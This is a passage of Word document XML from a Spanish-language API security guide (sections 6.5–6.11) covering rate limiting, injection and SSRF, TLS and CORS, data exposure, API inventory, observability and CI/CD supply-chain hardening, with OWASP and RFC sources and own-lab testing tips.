        </w:rPr>
        <w:t xml:space="preserve"> ausencia de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>429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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>Retry-After</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, límites solo por IP (trivial de rotar), GraphQL sin límite de profundidad, endpoints costosos sin cuota.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se prueba (lab):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> enviar N requests y medir si hay </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>429</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>; en tu lab GraphQL, enviar una consulta anidada profunda.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> OWASP API4:2023 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Unrestricted Resource Consumption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6.6 Validación de entrada e inyección</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> que la entrada no cambie el significado de lo que hace el sistema.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Inyección:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> SQL, NoSQL, comandos del sistema, LDAP, plantillas (SSTI).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>SSRF:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el servidor es inducido a pedir una URL interna (metadatos cloud, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>localhost</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>XXE:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> entidades externas XML (SOAP, parsers XML).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Deserialización insegura:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> objetos que al reconstruirse ejecutan código o cambian estado.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Mass assignment:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ver 4.3.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Defensa:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> validación por lista blanca, tipado estricto, parametrización, deserialización sin código, allowlist de dominios salientes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se prueba (lab):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> crAPI/DVGA/Juice Shop; Burp Collaborator para SSRF; PortSwigger labs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> OWASP API7:2023 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>SSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>; OWASP Top 10 (2021).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6.7 Transporte y red</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> confidencialidad, integridad y autenticidad del canal.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>TLS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> obligatorio; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>mTLS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> para autenticación mutua; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>HSTS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>; cifrados modernos; deshabilitar versiones viejas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>HTTP/2 y HTTP/3 (QUIC)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> cambian supuestos de proxies e inspección.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>CORS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> bien acotado (no </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> con credenciales); </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cabeceras de seguridad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Pinning</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en clientes móviles (con sus propios riesgos de operación).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fallas típicas:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> protocolos obsoletos, terminación TLS en un punto no confiable, CORS permisivo, tokens viajando por HTTP, certificados sin rotación.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se prueba:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> escanear cifrados (testssl.sh) contra </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> endpoint; revisar CORS con un origen propio.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> RFC 9700 (2025); OWASP API8:2023.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6.8 Exposición de datos, errores e información</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> no entregar más de lo necesario, ni señalar de más.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Data minimization:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> devolver solo los campos que el consumidor necesita.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Errores:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> mensajes verbosos que revelan stack, rutas, versiones o existencia de recursos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Sobre-exposición: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1F3B66"/>
        </w:rPr>
        <w:t>debug</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>introspection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, endpoints de estado (health, metrics) abiertos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Logs:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> nunca registrar tokens, contraseñas ni PII sin protección.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se prueba:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> provocar errores y leer la respuesta; pedir un recurso inexistente y ver si el error filtra.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> OWASP API3:2023 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>BOPLA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>; OWASP API8:2023.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6.9 Inventario, versionado y ciclo de vida</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> saber qué APIs existes y cuáles siguen vivas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Descubrimiento y catálogo:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> toda API con dueño, propósito y clasificación.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Versionado y deprecación:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> plan explícito para retirar versiones viejas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Shadow / zombie APIs:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> olvidadas, sin mantenimiento, sin protección.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fallas típicas: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1F3B66"/>
        </w:rPr>
        <w:t>/v1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>/beta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> expuestas, documentación pública de endpoints internos, servicios retirados pero accesibles.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se prueba:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> fuzzing de rutas y versiones contra </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> entorno; revisar el catálogo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> OWASP API9:2023 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Improper Inventory Management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6.10 Observabilidad, detección y respuesta</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> que puedas ver y reaccionar.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Logging</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> estructurado (sin secretos) y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>trazas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> distribuidas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>SIEM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y detección de anomalías: token usado desde dos geografías, picos de error, enumeración de IDs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Revocación</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RFC 7009) e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>introspección</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RFC 7662).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Respuesta a incidentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> playbooks para "token filtrado", "credencial de CI expuesta", "abuso masivo".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fallas típicas:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> no saber qué tokens están vivos; no poder revocar un refresh; no detectar reuso.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se prueba:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> simular el robo de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> token y verificar si el sistema lo detecta o lo revoca.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> RFC 7009 (2013); RFC 7662 (2015); NIST SP 800-61 (respuesta a incidentes).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6.11 Cadena de suministro y CI/CD</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué protege:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> que el software y sus dependencias no introduzcan el próximo incidente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Secretos en el pipeline:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> escaneo de repos y de CI (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>gitleaks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ggshield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trufflehog</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>secret managers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, rotación.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Dependencias:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> SBOM, análisis de composición (SCA), fijado de versiones, revisión de mantenedores.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Pipeline hardening:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> permisos mínimos del runner, aislamiento, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>builds</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> reproducibles, firma de artefactos (SLSA).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Consumo de terceros:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> no confiar en respuestas de servicios externos sin validar (Api10 de OWASP).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fallas típicas:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> tokens de CI con permisos amplios, acciones de terceros sin pin de commit, dependencias abandonadas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se prueba:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> correr un escáner de secretos en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> repo; revisar permisos del </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>GITHUB_TOKEN</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en tu pipeline.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fuentes:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> OWASP API10:2023 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Unsafe Consumption of APIs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>; caso Codecov (2021); SLSA.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
